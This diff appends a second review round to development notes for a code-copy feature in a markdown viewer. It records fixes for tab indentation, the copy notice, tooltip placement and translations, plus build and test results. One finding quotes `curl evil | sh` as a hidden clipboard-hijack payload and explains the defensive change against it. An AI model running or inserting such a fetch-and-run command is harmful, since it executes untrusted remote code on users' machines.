@@ -175,3 +175,50 @@ for tc-copy-notes.md opens), KEY-AGAIN, FAILCOPY (no tooltip), HIJACK (copies th
 block, tooltip visible, text `Copied\nHIDDEN PAYLOAD`). Negative controls for these rows
 are the reviewer's measurements on the previous build (SEQ-2 copied nothing, LINK-TCCOPY
 no window, HIJACK no visible sign).
+
+### Review 2 (refute-first agent) - 1 MUST, 1 SHOULD, 5 NOTEs
+
+The reviewer reproduced harness 105/0 and the probe 18/0/1 on its own run.
+
+- **M1** a tab in a code line's indentation was copied as spaces (md4c writes a line's
+  indentation from a static string of spaces, `md4c.c` `md_process_verbatim_block_contents`;
+  a Makefile pasted from the copy fails). **Fixed**: the generator keeps a copy buffer of
+  its own (`Gen::copyBuf`); an indentation run whose pointer lies outside the document is
+  held, and when the line's text (a pointer into the document) follows, `RecoverIndent`
+  walks back over the whitespace within the announced columns (tab stops of 4) and copies
+  it as written; a tab straddling the container / block indentation gives its share as
+  spaces (CommonMark). Anything that does not add up keeps md4c's spaces. The page is
+  unchanged (it still renders `codeBuf`). Harness rows: fenced Makefile (tabs kept, page
+  still spaces), indented block `\t\tbar` -> `\tbar`, list, straddling tab in a list item
+  (`  code`), quote `>\t\tq` (`  q`, CommonMark example 6), spaces stay spaces, an
+  indented fence, a whitespace-only line. Negative control: `RecoverIndent` forced to
+  return spaces -> **4 rows fail** (112/4); restored -> 116/0.
+- **S1** the notice named only the first line, so a hidden block starting `# Welcome`
+  still hid `curl evil | sh`; a bidi override passed into the notice. **Fixed**:
+  `MdCopyNoticeText(..., 60, 3)` shows up to three non-blank lines and a last line `…`
+  when more follow; C0/C1 controls and bidi formatting characters (U+202A-202E,
+  U+2066-2069, U+200E/F, U+061C) are shown as spaces. The spec states the remaining risk
+  (a click on a disguised element overwrites the clipboard - new with 408 - but never
+  silently). Harness rows; probe HIJACK now uses the reviewer's multi-line payload:
+  notice `Copied\n# Welcome\nline 2\nline 3\n…`.
+- **N1** the notice tooltip is not dark-themed (readable; noted, not changed - native
+  tooltips of the product are not themed either).
+- **N2** **fixed**: the notice is kept inside the work area of the viewer's monitor
+  (`MonitorFromWindow` / `GetMonitorInfoW`), coordinates passed as signed words.
+- **N3** **fixed**: the tooltip text of the control was an imperative addressed to the
+  reader in cs/sk/de/es/hu/ro/nl; pinned to the action form in
+  `translations/ui-overrides.json` (`mdview` / `_feature_408`, `IDS_CODE_COPY_TIP`): cs
+  Zkopírovat kód do schránky, sk Skopírovať kód do schránky, de Code in die Zwischenablage
+  kopieren, es Copiar el código al portapapeles, hu Kód másolása a vágólapra, ro Copierea
+  codului în clipboard, nl De code naar het klembord kopiëren (fr already infinitive). The
+  merge applied them: only row 2198 changed in each `.slt` / `.origin`; `slt --verify`
+  298 files byte-exact.
+- **N4** Release build: `.\build.cmd full release` (result below).
+- **N5** checks without defect - recorded.
+
+After the fixes: harness **116 passed, 0 failed**; `.\build.cmd full` BUILD SUCCEEDED;
+probe **18 PASS, 0 FAIL, 1 NOT DRIVEN** (NOTICE text `Copied\nalpha line 1\nbeta
+čeština 😀`, HIJACK as above).
+- N4: `.\build.cmd full release` -> **BUILD SUCCEEDED** (LTO); Release `mdview.spl` (320,000
+  bytes) holds the family `https://mdcopy.invalid/` (UTF-16) and **not** the seam name
+  `TC_MDVIEW_PROBE_COPY_LOG`; the Debug `mdview.spl` holds it (the seam is Debug-only).
